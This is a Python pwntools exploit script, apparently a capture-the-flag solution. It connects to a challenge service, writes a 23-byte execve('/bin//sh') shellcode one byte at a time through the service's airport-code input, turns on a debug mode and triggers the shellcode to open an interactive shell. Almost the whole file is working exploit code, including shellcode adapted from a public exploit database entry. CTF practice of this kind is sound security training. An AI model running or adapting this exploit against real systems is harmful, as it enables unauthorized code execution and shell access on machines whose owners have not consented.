import argparse

from pwn import *

network = True
PATH = '../challenge/handout/challenge'

if network:
    parser = argparse.ArgumentParser()
    parser.add_argument("address", default="127.0.0.1:8001",
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    r = process(PATH, level='debug')
    #r = gdb.debug(PATH, level='debug')
#context.log_level = 'debug'



context(arch='amd64', os='linux')



def write_one(n):
    r.sendline(b'1')
    r.recvuntil(b' airport code: ')
    buf = b'A' * n
    buf += b'\x00' * (256 - len(buf))
    r.send(buf)
    r.recvuntil(b'Get tickets!\n')


#r.recvuntil(b'Get tickets!\n')

# 48 bytes, 4097 sum
#shellcode = asm(shellcraft.sh())

# https://www.exploit-db.com/exploits/46907
# 23 bytes, 2081 sum
#orig_shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# swapped "xor rsi, rsi" for "push 0; pop rsi"
# 23 bytes, sum: 1914
shellcode = b"\x6a\x00\x5e\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

sum = sum(b for b in shellcode)


print("Writing shellcode to target...")
for cur_byte in shellcode:
    write_one(cur_byte)

# turn on "debug"
r.sendline(b'd')
r.recvuntil(b'Get tickets!\n')

# trigger shellcode
r.sendline(b'3')


r.interactive()
